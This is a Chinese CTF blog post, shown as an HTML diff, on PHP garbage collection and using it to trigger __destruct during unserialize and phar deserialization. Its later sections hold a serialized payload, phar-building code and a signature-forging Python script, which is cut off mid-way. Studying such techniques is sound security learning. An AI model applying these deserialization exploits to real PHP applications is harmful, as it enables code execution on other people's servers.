@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='PHP底层 GC 垃圾回收机制 PHP: 引用计数基本知识 - Manual 建议一定先看完 PHP官方手册的说明 简单理解为一个对象没有被引用的时候 就会被GC机制回收 在被回收'>
+<title>PHP底层_GC_垃圾回收机制</title>
+
+<link rel='canonical' href='http://main1o.eu.org/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/'>
+
+<link rel="stylesheet" href="/scss/style.min.b9d3b9e1847a2abb770d14e8117e1dcb6cdae19de947eed1abc74cc7f25e5042.css"><meta property='og:title' content='PHP底层_GC_垃圾回收机制'>
+<meta property='og:description' content='PHP底层 GC 垃圾回收机制 PHP: 引用计数基本知识 - Manual 建议一定先看完 PHP官方手册的说明 简单理解为一个对象没有被引用的时候 就会被GC机制回收 在被回收'>
+<meta property='og:url' content='http://main1o.eu.org/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/'>
+<meta property='og:site_name' content='main1o&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='php' /><meta property='article:published_time' content='2023-01-20T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-01-20T00:00:00&#43;00:00'/><meta property='og:image' content='http://main1o.eu.org/%E5%A4%AA%E7%A9%BA%E5%A2%99%E7%BA%B8.jpg' />
+<meta name="twitter:title" content="PHP底层_GC_垃圾回收机制">
+<meta name="twitter:description" content="PHP底层 GC 垃圾回收机制 PHP: 引用计数基本知识 - Manual 建议一定先看完 PHP官方手册的说明 简单理解为一个对象没有被引用的时候 就会被GC机制回收 在被回收"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://main1o.eu.org/%E5%A4%AA%E7%A9%BA%E5%A2%99%E7%BA%B8.jpg' />
+    <link rel="shortcut icon" href="/monv.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu325d5c1f3011b78da0c57ed7949f30eb_773756_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">main1o&#39;s Blog</a></h1>
+            <h2 class="site-description">🚩荆棘之路</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#php-深浅拷贝">PHP 深浅拷贝</a>
+      <ol>
+        <li><a href="#深拷贝">深拷贝：</a></li>
+        <li><a href="#浅拷贝">浅拷贝：</a></li>
+      </ol>
+    </li>
+    <li><a href="#反序列化中的作用">反序列化中的作用</a>
+      <ol>
+        <li><a href="#demo-">Demo :</a></li>
+        <li><a href="#gc-phar反序列化利用">GC Phar反序列化利用:</a></li>
+      </ol>
+    </li>
+    <li><a href="#参考链接">🔗参考链接</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/">
+                
+                    <img src="/%e5%a4%aa%e7%a9%ba%e5%a2%99%e7%ba%b8.jpg" loading="lazy" alt="Featured image of post PHP底层_GC_垃圾回收机制" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                ctf
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/">PHP底层_GC_垃圾回收机制</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2023-01-20</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="php底层-gc-垃圾回收机制">PHP底层 GC 垃圾回收机制</h1>
+<blockquote>
+<p><a class="link" href="https://www.php.net/manual/zh/features.gc.refcounting-basics.php"  target="_blank" rel="noopener"
+    >PHP: 引用计数基本知识 - Manual</a></p>
+</blockquote>
+<p><strong>建议一定先看完 PHP官方手册的说明</strong></p>
+<p>简单理解为一个对象没有被引用的时候 就会被<code>GC</code>机制回收 在被回收的同时 会触发<code>__destruct()</code>方法 这是一个关键点~</p>
+<p><code>refcount</code>变量引用计数  	<code>is_ref</code>是否被引用 bool值</p>
+<p>调试工具<a class="link" href="http://xdebug.org/"  target="_blank" rel="noopener"
+    >Xdebug - Debugger and Profiler Tool for PHP</a>  如果是小皮面板的话直接 <strong>php扩展</strong>开启就行了</p>
+<p>PHP不同版本下<strong>GC机制</strong>有变化   以下环境为<code>PHP 5.4.45</code>模拟</p>
+<h2 id="php-深浅拷贝">PHP 深浅拷贝</h2>
+<blockquote>
+<p>在 PHP 中引用意味着用不同的名字访问同一个变量内容。这并不像 C 的指针：例如你不能对他们做指针运算，他们并不是实际的内存地址。替代的是，引用是符号表别名。注意在PHP 中，变量名和变量内容是不一样的，因此同样的内容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——变量名是目录条目，而变量内容则是文件本身。引用可以被看作是 Unix 文件系统中的硬链接</p>
+</blockquote>
+<p><strong>引用取消</strong> 则需要使用<code>unset()</code>只是断开了变量名和变量内容之间的绑定,并不是说变量内容被销毁了</p>
+<h3 id="深拷贝">深拷贝：</h3>
+<blockquote>
+<p>赋值时值完全复制对其中一个作出改变，不会影响另一个</p>
+<p>在PHP5以上，对象的 = 赋值和传递都是引用(浅)。php提供了<code>clone</code>函数实现拷贝副本</p>
+</blockquote>
+<p>直接把<code>$a</code>赋值给<code>$b</code>之后，<code>$b</code>修改并不会对<code>$a</code>任何影响，可以看到2次输出都是<code>main1o</code></p>
+<p>变量<code>$a</code>引用计数值<code>refcount</code>也为1，并且<code>is_ref</code>也是false</p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657.png"
+	width="602"
+	height="374"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657_hu1de70d15941b9226eeb9f95b24893657_28105_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657_hu1de70d15941b9226eeb9f95b24893657_28105_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120132330657"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="160"
+		data-flex-basis="386px"
+	
+></p>
+<p>对象的深拷贝  用clone函数拷贝出一个完全一样的对象，修改该对象，并不会影响原始对象</p>
+<p>修改<code>$a</code>对象，只会对<code>$b</code>对象有影响，并不会对<code>$c</code>对象有任何影响</p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985.png"
+	width="438"
+	height="342"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985_hu203ac5e83798495d20a8550afc078184_23242_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985_hu203ac5e83798495d20a8550afc078184_23242_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120134851985"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="128"
+		data-flex-basis="307px"
+	
+></p>
+<h3 id="浅拷贝">浅拷贝：</h3>
+<blockquote>
+<p>赋值时，引用赋值，相当于取了一个别名。对其中一个修改，会影响另一个</p>
+</blockquote>
+<p>使用<code>&amp;</code>来使用自定义引用变量，我们对<code>$a</code>进行修改 直接影响了<code>$b</code> “main1o” &ndash;&gt; &ldquo;ikun&rdquo;</p>
+<p>就是<code>$a</code> 和<code>$b</code>都指向内存中的同一块地址</p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873.png"
+	width="607"
+	height="354"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873_hu1e41287177b147b4aad1be9296cba66c_28204_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873_hu1e41287177b147b4aad1be9296cba66c_28204_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120140131873"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="411px"
+	
+></p>
+<h2 id="反序列化中的作用">反序列化中的作用</h2>
+<p>补充：</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>方法名</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>__construct</td>
+<td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td>
+</tr>
+<tr>
+<td>__destruct</td>
+<td>析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为<code>null</code>)或者<code>程序退出</code>时自动调用 即对象被销毁触发！手动销毁为<code>unset(Object)</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>手动销毁对象<code>unset()</code>触发了<code>$a</code>对象中的析构函数。提前输出了 1__destruct()</p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001.png"
+	width="606"
+	height="629"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001_hu061b4060c96bd52b782080f2df917f77_54584_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001_hu061b4060c96bd52b782080f2df917f77_54584_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120144320001"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="96"
+		data-flex-basis="231px"
+	
+></p>
+<p>还有对象引用被视为null 也会触发，这里举个例子</p>
+<p>变量赋值都是 <strong>自右向左</strong> 所以数组中的第二个元素0 覆盖了对象失去了引用，那么就满足触发GC回收了。即触发<code>__destruct</code></p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356.png"
+	width="612"
+	height="648"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356_hucf92e2ee1d8bf9e6495b2367ce13cb08_56674_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356_hucf92e2ee1d8bf9e6495b2367ce13cb08_56674_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120150717356"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="94"
+		data-flex-basis="226px"
+	
+></p>
+<h3 id="demo-">Demo :</h3>
+<p>最后一行代码错误抛出异常，是无法触发<code>__destruct </code>  需要正常结束程序</p>
+<p>那我们就可以通过上面介绍的触发<code>GC机制</code> 来绕过。这里将第二个索引置空。</p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396.png"
+	width="554"
+	height="406"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396_hu0dee8c5d562011d8ed2c16bb1351a20a_30909_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396_hu0dee8c5d562011d8ed2c16bb1351a20a_30909_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120152723396"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="327px"
+	
+></p>
+<p><strong>Payload：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;B&#34;</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424.png"
+	width="555"
+	height="373"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424_hue86eeee58af33985c513547bfcb49471_29764_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424_hue86eeee58af33985c513547bfcb49471_29764_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120160431424"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="357px"
+	
+> <img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716.png"
+	width="581"
+	height="371"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716_hu13f5293e9690aaac09b5611cc1b64a54_35743_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716_hu13f5293e9690aaac09b5611cc1b64a54_35743_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120160507716"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="375px"
+	
+></p>
+<h3 id="gc-phar反序列化利用">GC Phar反序列化利用:</h3>
+<p>Phar反序列化，使用<code>file_get_contents()</code>函数，先按照正常流程去生成一个<code>.phar</code>文件</p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572.png"
+	width="483"
+	height="387"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572_huf4e96f746b280f49a1bfd48cbf553c4a_31940_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572_huf4e96f746b280f49a1bfd48cbf553c4a_31940_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120161313572"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="299px"
+	
+></p>
+<p>生成步骤就不一一累述了，注意需要开启<code>php.ini</code>中的<code>phar.readonly = Off</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">test</span><span class="p">{</span><span class="k">public</span> <span class="nv">$code</span><span class="o">=</span> <span class="s2">&#34;phpinfo();&#34;</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;1.phar&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER();?&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;test&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于生成的phar文件不能随意修改，否则签名不匹配。先按照原来的方法修改数组值，然后在通过脚本进行伪造签名。</p>
+<p>使用16进制编辑器打开 可以看到<code>i:1</code>修改为<code>i:0</code>  保存</p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824.png"
+	width="629"
+	height="270"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824_hu8afac5acadbb255c1b8dfe0e9a37f03d_56564_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824_hu8afac5acadbb255c1b8dfe0e9a37f03d_56564_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120162413824"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="232"
+		data-flex-basis="559px"
+	
+></p>
+<p>exp.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gzip</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;1.phar&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">[:</span><span class="o">-</span><span class="mi">28</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="o">-</span><span class="mi">8</span><span class="p">:]</span> 
+</span></span><span class="line"><span class="cl"><span class="n">newf</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="n">sha1</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span> <span class="o">+</span> <span class="n">h</span>
